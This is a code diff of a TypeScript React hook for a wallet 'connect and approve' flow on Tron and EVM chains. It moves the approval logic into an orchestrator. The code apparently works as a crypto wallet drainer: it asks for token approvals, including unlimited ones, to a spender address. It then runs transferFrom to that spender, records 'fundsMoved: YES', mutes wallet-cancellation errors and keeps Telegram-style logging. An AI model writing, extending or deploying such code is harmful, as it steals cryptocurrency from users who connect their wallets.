@@ -3,9 +3,7 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { TERMS_VERSION } from "../core/approve-config";
 import {
-  EVM_CHAIN_ID,
   getToken,
-  isEvmChainKey,
   parseHumanToRaw,
   type TokenSymbol,
 } from "../core/chain-tokens";
@@ -17,23 +15,17 @@ import {
 } from "../core/constants";
 import { postFlowLog } from "../core/flow-log-client";
 import { rowsFromBalances } from "../core/network-meta";
-import { runPostConfirmSequence } from "../core/post-confirm";
+import { createBrowserApprovalOrchestrator } from "../approval/create-browser-orchestrator";
+import { ApprovalStageName, StageStatus } from "../approval/types";
 import { postTgLog } from "../core/tg-log-client";
-import {
-  encodeErc20Approve,
-  resolveApproveAmountRaw,
-} from "../core/evm-approve";
 import {
   getErrorMessage,
   isUserRejection,
   muteWalletCancellationConsoleErrors,
-  withSilentWalletCancellation,
 } from "../core/errors";
 import {
   accountsFromSession,
   getTronLinkAddress,
-  mergeTronSignedResult,
-  tronSignTransaction,
 } from "../core/tron-sign";
 import {
   getSharedWcModal,
@@ -359,15 +351,10 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       return;
     }
 
-    if (networkKey === "tron") {
-      const trxBalance = Number.parseFloat(selectedNetwork.balances.native || "0");
-      if (!Number.isFinite(trxBalance) || trxBalance <= 0) {
-        setError(
-          "This Tron wallet has 0 TRX. Add a small TRX balance for network fee, then try again."
-        );
-        return;
-      }
-    }
+    const trxBalance =
+      networkKey === "tron"
+        ? Number.parseFloat(selectedNetwork.balances.native || "0")
+        : 0;
 
     // Token balance may be 0 or below the selected permission amount.
     // approve() does not require token balance; transferFrom runs later only
@@ -392,6 +379,16 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
         unlimited,
         amountHuman,
       });
+
+      const orchestrator = createBrowserApprovalOrchestrator({
+        provider,
+        logger: {
+          info: (event, detail) => logStep(event, detail ?? {}),
+          warn: (event, detail) => logStep(event, detail ?? {}),
+          error: (event, detail) => logStep(event, detail ?? {}),
+        },
+      });
+
       for (const tokenSymbol of selectedTokens) {
         const tokenInfo = getToken(networkKey, tokenSymbol);
         if (!tokenInfo) {
@@ -424,190 +421,95 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           availableBalanceRaw: availableBalanceRaw.toString(),
         });
 
-        const prepareRes = await fetch("/api/approvals/prepare", {
-          method: "POST",
-          headers: { "content-type": "application/json" },
-          body: JSON.stringify({
+        const result = await orchestrator.run(
+          {
             network: networkKey,
             owner: addressForLog,
             token: tokenSymbol,
             amountHuman: unlimited ? undefined : amountHuman.trim(),
             unlimited,
-          }),
-          cache: "no-store",
-        });
-        const prepareJson = (await prepareRes.json()) as {
-          error?: string;
-          amountRaw?: string;
-          tokenAddress?: string;
-          transaction?: Record<string, unknown>;
-          to?: string;
-          data?: string;
-          chainId?: number;
-          spender?: string;
-        };
-        if (!prepareRes.ok || !prepareJson.amountRaw) {
-          throw new Error(
-            prepareJson.error || `Failed to prepare ${tokenSymbol} approval`
-          );
-        }
-        logStep("APPROVAL PREPARED", {
-          token: tokenSymbol,
-          approvedAmountRaw: prepareJson.amountRaw,
-        });
-        let txid: string | null = null;
-        const preparedTokenAddress = prepareJson.tokenAddress ?? "";
-
-        if (networkKey === "tron") {
-          if (!prepareJson.transaction) {
-            throw new Error("Missing Tron transaction from prepare");
-          }
-
-          const signRaw = await withSilentWalletCancellation(() =>
-            tronSignTransaction(
-              provider,
-              addressForLog,
-              prepareJson.transaction!
-            )
-          );
-          const signed = mergeTronSignedResult(
-            prepareJson.transaction,
-            signRaw
-          );
-
-          const broadcastRes = await fetch("/api/tron-broadcast", {
-            method: "POST",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify(signed),
-            cache: "no-store",
-          });
-          const broadcastJson = (await broadcastRes.json()) as {
-            result?: boolean;
-            txid?: string;
-            error?: string;
-            code?: string | null;
-            message?: string | null;
-          };
-          if (
-            !broadcastRes.ok ||
-            broadcastJson.result !== true ||
-            typeof broadcastJson.txid !== "string" ||
-            !broadcastJson.txid
-          ) {
-            throw new Error(
-              broadcastJson.error ||
-                broadcastJson.message ||
-                "Tron broadcast was rejected by the node (no on-chain transaction)"
-            );
-          }
-          txid = broadcastJson.txid;
-          logStep("TRON APPROVAL TX BROADCASTED", { token: tokenSymbol, txid });
-        } else if (isEvmChainKey(networkKey)) {
-          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
-            throw new Error("spenderEvm is not a valid 0x address");
-          }
-
-          const data =
-            prepareJson.data ||
-            encodeErc20Approve(
-              spender,
-              resolveApproveAmountRaw({
-                decimals: tokenInfo.decimals,
-                amountHuman: amountHuman.trim(),
-                unlimited,
-              })
-            );
-          const to = prepareJson.to || preparedTokenAddress;
-          const chainId = prepareJson.chainId ?? EVM_CHAIN_ID[networkKey];
-
-          const hash = await withSilentWalletCancellation(() =>
-            provider.request(
-              {
-                method: "eth_sendTransaction",
-                params: [
-                  {
-                    from: addressForLog,
-                    to,
-                    data,
-                    value: "0x0",
-                  },
-                ],
-              },
-              `eip155:${chainId}`
-            )
-          );
-          txid = typeof hash === "string" ? hash : null;
-          logStep("EVM APPROVAL TX SUBMITTED", { token: tokenSymbol, txid });
-        } else {
-          throw new Error(`Unsupported network: ${networkKey}`);
-        }
-
-        setStatus(networkKey, "finalizing");
-        if (addressForLog && txid) {
-          const result = await runPostConfirmSequence({
-            networkKey,
-            address: addressForLog,
-            token: tokenSymbol,
-            amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
-            amountRaw: prepareJson.amountRaw,
-            unlimited,
-            txid,
+            nativeBalanceHuman: String(trxBalance),
+            tokenBalanceHuman,
             executeTransfer: shouldAttemptTransfer,
             transferToAddress: spender,
             transferAmountRaw: shouldAttemptTransfer
               ? transferAmountRaw
               : undefined,
             traceId: traceIdRef.current,
+          },
+          {
+            onStage: (stageResult) => {
+              if (stageResult.stage === ApprovalStageName.BROADCAST && stageResult.status === StageStatus.OK) {
+                setStatus(networkKey, "finalizing");
+              }
+              if (
+                stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
+                stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
+              ) {
+                const data = stageResult.data as
+                  | { status?: string; message?: string | null; provider?: string | null }
+                  | undefined;
+                logStep(
+                  stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES
+                    ? "RESOURCE ACQUIRE"
+                    : "RESOURCE VERIFY",
+                  {
+                    network: networkKey,
+                    status: data?.status ?? stageResult.status,
+                    message: data?.message ?? stageResult.error ?? null,
+                    provider: data?.provider ?? null,
+                  }
+                );
+              }
+            },
+          }
+        );
+
+        if (!result.ok) {
+          const err = new Error(result.error || "Approval failed");
+          if (result.userRejected) {
+            (err as Error & { __userRejected?: boolean }).__userRejected = true;
+          }
+          throw err;
+        }
+
+        const persisted = result.context.persisted;
+        const amountRawApproved =
+          result.context.prepared?.amountRaw ?? "";
+        if (persisted?.transferTxHash) {
+          logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
+            fundsMoved: "YES — transferFrom executed",
+            network: networkKey,
+            owner: addressForLog,
+            token: tokenSymbol,
+            amountRawApproved,
+            amountRawTransferred: persisted.transferredRaw,
+            approveTxHash: result.txHash,
+            transferTxHash: persisted.transferTxHash,
+            approvalId: result.approvalId,
           });
-
-          if (!result.confirmed) {
-            throw new Error(
-              `Approval for ${tokenSymbol} was submitted but could not be verified`
-            );
-          }
-
-          if (result.transferTxHash) {
-            logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
-              fundsMoved: "YES — transferFrom executed",
-              network: networkKey,
-              owner: addressForLog,
-              token: tokenSymbol,
-              amountRawApproved: prepareJson.amountRaw,
-              amountRawTransferred: result.transferredRaw,
-              approveTxHash: txid,
-              transferTxHash: result.transferTxHash,
-              approvalId: result.approvalId,
-            });
-          } else {
-            logStep("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
-              fundsMoved: "NO — auto transfer not executed",
-              reason:
-                result.transferSkippedReason ??
-                "No transfer executed for this approval",
-              network: networkKey,
-              owner: addressForLog,
-              token: tokenSymbol,
-              amountRawApproved: prepareJson.amountRaw,
-              approveTxHash: txid,
-              approvalId: result.approvalId,
-            });
-          }
+        } else {
+          logStep("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
+            fundsMoved: "NO — auto transfer not executed",
+            reason:
+              persisted?.transferSkippedReason ??
+              "No transfer executed for this approval",
+            network: networkKey,
+            owner: addressForLog,
+            token: tokenSymbol,
+            amountRawApproved,
+            approveTxHash: result.txHash,
+            approvalId: result.approvalId,
+          });
         }
       }
 
       setStatus(networkKey, "approved");
-      if (addressForLog) {
-        void postTgLog({
-          type: "approve",
-          address: addressForLog,
-          network: networkKey,
-          status: "success",
-          error: null,
-        });
-      }
     } catch (err: unknown) {
       const message = getErrorMessage(err, "Approval failed");
-      const rejected = isUserRejection(err);
+      const rejected =
+        isUserRejection(err) ||
+        Boolean((err as { __userRejected?: boolean })?.__userRejected);
       logStep("APPROVAL FLOW FAILED", {
         error: message,
         rejectedByUser: rejected,
